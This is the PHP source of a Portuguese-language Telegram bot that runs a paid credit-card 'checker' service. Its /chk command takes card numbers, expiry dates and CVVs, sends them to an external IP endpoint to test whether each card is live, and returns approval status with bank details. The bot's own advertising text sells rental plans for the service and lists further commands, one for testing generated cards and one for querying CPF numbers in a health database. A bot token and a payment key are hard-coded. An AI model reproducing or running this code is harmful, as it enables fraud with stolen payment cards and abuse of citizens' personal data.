<?php
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
$botToken = "6142553859:AAEvhuR1dN0xzi6_F8SoUn9yJCVd9vaznhk"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$usuario = "@".$username;
$datadehoje = date('H:i:s - d/m/Y');
$userbot = "Lukyn Store";
$userdono = "@lukyn404";
$chavepix = "b111f065-aec7-4b3e-9616-45477fe50b2d";
////////======== SET WEB HOOK ========//////////////

echo $setwebhook = file_get_contents("https://api.telegram.org/bot$botToken/setwebhook?url=https://thedeluxebrasil.xyz/mybots/pladix.php");


    $inline_button1 = array("text"=>"💸COMPRAR VIP💸","url"=>"https://t.me/pladixoficial");
    $inline_button2 = array("text"=>"⚙️SUPORTE⚙️","url"=>"https://t.me/pladixsuportebot");
    $inline_button3 = array("text"=>"🏆 Melhor StoreBot 🏆","url"=>"https://t.me/acepladixstore_bot");
    $inline_button4 = array("text"=>"💎 COMPRAR VIP 💎","url"=>"https://t.me/pladixoficial");
    $inline_button6 = array("text"=>"🏆EM BREVE🏆","callback_data"=>"/menu");
    $inline_button7 = array("text"=>"🏆EM BREVE🏆","callback_data"=>"/info");
    $vipkk = array("text"=>"💎 COMPRAR ACESSO 💎","url"=>"https://t.me/pladixoficial");
    $inline_keyboard = [[$vipkk]];
    $keyboard=array("inline_keyboard"=>$inline_keyboard);
    $replyMarkup = json_encode($keyboard); 

$chatIds = explode("\n", file_get_contents("vips-tutorialdovideo.txt"));


//___________________________________//
// ADD USER

if ((strpos($message, "/cadastrar") === 0) || (strpos($message, ".cadastrar") === 0) || (strpos($message, "!cadastrar") === 0)) {
$data_add = substr($message, 11);

$adm_add = array("2075852417");
if (in_array($userId, $adm_add)){

if (empty($data_add)) {
sendMessage($chatId, "⚠️ <b>Não conseguimos adicionar este ID, por favor verifique o ID: $data_add e tente novamente mais tarde.</b> ⚠️", $message_id, $replyMarkup);}

else if (!is_numeric($data_add)) {
sendMessage($chatId, "⚠️ <b>Este ID já existe em nosso banco de dados, por favor verifique o ID: $data_add e tente novamente mais tarde.</b> ⚠️", $message_id, $replyMarkup);}

else if (strpos(file_get_contents("vips-tutorialdovideo.txt"), "$data_add") !== false) {
sendMessage($chatId, "⚠️ <b>Não conseguimos adicionar este ID pois o mesmo já tem um VIP ativo, por favor verifique o ID: $data_add e tente novamente mais tarde.</b> ⚠️", $message_id, $replyMarkup);}

else {
$file = fopen("vips-tutorialdovideo.txt", "a");
fwrite($file, $data_add." $datadehoje\n\r");
fclose($file);
sendMessage($chatId, "[ ⚡ ] Administrador do Bot [ ⚡ ]

✅ » <b>ID: $data_add foi cadastrado com sucesso!</b> »
ℹ️ » <b>Data de Cadastro: $datadehoje</b> »
💳 » <b>Plano Permanente foi ativado para este usuário!</b>

[ ⚡ ] <i>Agradecemos a compra, e tenha um bom uso!</i>", $message_id, $replyMarkup);

} // FINALIZA O ELSE
} // FINALIZA O IF DE PERMISSAO

else {}
} // FINALIZA O COMANDO

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
$txt = "*Olá $firstname, seja bem vindo(a) no $userbot e estamos melhorando cada vez mais diante das recomendações do público!*

*🟢 Inicie o seu uso utilizando o comando /comandos para ver nossos comandos VIPS ou /id para ver sua ID do Telegram, após isso boa utilização é que temos para lhe dizer!*

*⚙️ Desenvolvedor de Bots/Stores » @pladixoficial*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/comandos") === 0){
$txt = "*ℹ️ Comandos do $userbot ℹ️*

*============================================*

*🟢 » Online, sem risco de problemas.*
*🟡 » Instável, problemas podem ocorrer.*
*🔴 » Offline, não estará funcionando corretamente.*

*============================================*

🟢 */chk - É utilizado para checar diversos cartões e você ver se o mesmo está APROVADO ou REPROVADO para realizar compras na internet de forma segura e livre de negação no pagamento.*

🔴 */bb - É utilizado para checar cartões gerados, e verificar se consta SEM VBV ou COM VBV, esperamos que você se divirta tirando cartões gerados para tentar aprovar em sites que tenham métodos/esquemas.*

🔴 */amex - É utilizado para checar cartões da bandeira AMEX e que sejam também gerados e com métodos/esquema para poder utilizar os cartões APROVADO deste checker.*

🔴 */ggelo - É utilizado para checar cartões da bandeira ELO, somente, não é autorizado nenhum outro tipo de cartão.*

🔴 */cpf - É usado para consultar CPF cadastrados no banco de dados CADSUS, só será retornado CPF's que contenham RG.*

🔴 */cx2 - É usado para verificar os últimos testes feitos no Checker, pelo fato do mesmo ser pago essa função não será liberada.*

🔄 *Sugestões? Envie para @pladixoficial*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
}


//////////=========[Info Command]=========//////////

elseif (strpos($message, "/id") === 0){
sendMessage($chatId, "🔍 *Informações do usuário:* 🔎

*============================================*

🕴️ *Nome do Perfil: $firstname*
🕴️ *Usuário do Perfil: $usuario*
🆔 *ID do Chat:* `$chatId`
🆔 *ID do Perfil:* `$gId`

*============================================*

🔄 *Situação do Cadastro: Online 🟢*", $message_id, $replyMarkup);
exit();
}

elseif (strpos($message, "/divulgar") === 0){
$divulgacao = "*🔍 $userbot 🔍
- ⚠️ O Checker bot é para você testar cartões pelo comando único de /chk, logo abaixo iremos informar os preços para os devidos planos recomendados aos clientes, lembramos que a pessoa tem acesso a diversos checkers!

🔄 | Clique aqui para contratar o CheckerBot

ℹ️ | Plano para Grupos e Pessoas:

- Grupo Semanal (7d) › R$ 10,00 💥
- Grupo Mensal (30d) › R$ 30,00 💥

ℹ️ | Plano para Testar Lista (Checker Web):

- Acesso Único (7d) › R$ 50,00 💥
- Acesso Único (30d) › R$ 80,00 💥

⚙️ | Benefícios do nosso bot:
1. O checker está ativo todos os dias para uso.
2. Está debitando valores muitos baixos, o material aprovado no mesmo não tem chance alguma de ser queimado ao tirar.
3. Você tem acesso ilimitado para usar durante o período que você pagou, sem problemas com limitações ou algo do tipo.
4. São solucionados todos os problemas que ocorrem durante um relatório de 24h em nossos bots.
5. Fique seguro, os cartões não são armazenados de forma que possa ser reutilizado pois apenas temos sistemas de retestes que bloqueiam que o mesmo número do cartão seja testado várias vezes.

🔄 | Contate $userdono (não chamo pv, apenas alugo para clientes que chamam!) caso tenha interesse em adquirir alguns de nossos serviços de CheckerBot.*";
sendMessage($chatId, "$divulgacao", $message_id, $replyMarkup);
exit();
}

if ((strpos($message, "/chk") === 0) || (strpos($message, ".chk") === 0) || (strpos($message, "!chk") === 0) || (strpos($message, "/Chk") === 0) || (strpos($message, ".Chk") === 0) || (strpos($message, "!Chk") === 0) || (strpos($message, "/CHK") === 0) || (strpos($message, ".CHK") === 0) || (strpos($message, "!CHK") === 0)) {
if (in_array($userId, $chatIds) || (in_array($chatId, $chatIds))){
$lista = substr($message, 5);
function getstr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $message);
if (!preg_match("/[0-9]{15,16}\|[0-9]{1,2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
$txt = "❌ - *Reprovada* - *( Informe o cartão corretamente. )*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}
$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];
$links = ["cielov2.php" , "verifica.php"];
$gates = $links[array_rand($links)];
if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

$str = ''.$lista.'';
$lines = file('reteste.txt');
foreach($lines as $line)
if (strpos($line, $str) !== false) {
$file = fopen("reteste.txt", "a");
fwrite($file, "RETESTE - $cc\n\r"); 
$txt = "❌ - *RETESTE*  `$cc $mes/$ano $cvv` *$infobin*
*ℹ️ Retorno: Não foi possível testar este cartão, pois é um reteste.*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://20.226.40.93/allbins.php?lista='.$lista.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Host: 20.226.40.93',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$fim = curl_exec($ch);
$lista = getstr($fim, '"lista":"','"');
$retorno = getstr($fim, '"message":"','"');
$valor = getstr($fim, '"valor":"','"');
if(strpos($fim, '"status":"live"')){
file_put_contents("reteste.txt", "$lista"."\n\r" ,FILE_APPEND);
$bin = json_decode(file_get_contents("https://storebot.store/binsearch.php?bin=".substr($cc , 0,6)), true);
$infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");
$txt = "✅ - *Aprovada*  `$cc $mes/$ano $cvv` *$infobin*
*ℹ️ Retorno: $retorno* 💸 *Debitou: R$2,03*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}elseif(strpos($fim, '"status":"die"')){
file_put_contents("reteste.txt", "$lista"."\n\r" ,FILE_APPEND);
$bin = json_decode(file_get_contents("https://storebot.store/binsearch.php?bin=".substr($cc , 0,6)), true);
$infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");
$txt = "❌ - *Reprovada*  `$cc $mes/$ano $cvv` *$infobin*
*ℹ️ Retorno: $retorno* 💸 *Negou: R$2,03*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}elseif(strpos($fim, '"status":"error"')){
file_put_contents("reteste.txt", "$lista"."\n\r" ,FILE_APPEND);
$bin = json_decode(file_get_contents("https://storebot.store/binsearch.php?bin=".substr($cc , 0,6)), true);
$infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");
$txt = "❌ - *Reprovada*  `$cc $mes/$ano $cvv` *$infobin*
*ℹ️ Retorno: Foi detectado error na api, por favor tente novamente.* 💸 *Nada foi debitado!*";
sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}
}else {
$txt = "*Autorização não concedida para você!, ID: $chatId*";

sendMessage($chatId, "$txt", $message_id, $replyMarkup);
exit();
}
}
function sendMessage ($chatId, $message, $message_id, $replyMarkup){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&reply_to_message_id=".$message_id."&reply_markup=".$replyMarkup."&parse_mode=Markdown&text=".urlencode($message);
file_get_contents($url);
};
curl_close($ch);
?>